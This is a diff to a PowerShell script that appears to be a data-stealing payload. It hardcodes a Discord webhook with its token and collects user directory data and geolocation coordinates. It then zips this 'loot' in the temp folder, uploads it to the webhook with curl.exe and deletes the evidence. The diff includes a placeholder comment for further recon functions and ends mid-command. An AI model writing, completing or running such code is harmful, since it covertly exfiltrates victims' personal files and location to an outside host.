@@ -8,8 +8,7 @@ $FileName = "$FolderName.txt"
 $ZIP = "$FolderName.zip"
 New-Item -Path $env:TEMP\$FolderName -ItemType Directory | Out-Null
 
-# Enter your access tokens below
-#$db = ""
+# Discord webhook
 $dc = "https://discord.com/api/webhooks/1366201501802041374/ENdipWjx_vaIQYHXDYo-kwppUazTUQ9LpTj7oewX0g_wln4_vi9F_HdVdiaiBjFoovZY"
 
 # Recon all User Directories
@@ -45,3 +44,27 @@ function Get-GeoLocation {
             Start-Sleep -Milliseconds 100
         }
         if ($GeoWatcher.Permission -eq 'Denied') {
+            Write-Error 'Access Denied for Location Information'
+            return "Lat:Unknown Lon:Unknown"
+        }
+        else {
+            $loc = $GeoWatcher.Position.Location
+            return "Lat:$($loc.Latitude) Lon:$($loc.Longitude)"
+        }
+    } catch {
+        Write-Error "No coordinates found"
+        return "Lat:Unknown Lon:Unknown"
+    }
+}
+
+# ... (rest of your recon functions and data collection)
+
+# Compress loot
+Compress-Archive -Path $env:tmp\$FolderName -DestinationPath $env:tmp\$ZIP
+
+# Upload to Discord
+curl.exe -F "file1=@$env:tmp\$ZIP" $dc
+
+# Cleanup
+Remove-Item $env:TEMP\$FolderName -Recurse -Force -ErrorAction SilentlyContinue
+Remove-Item
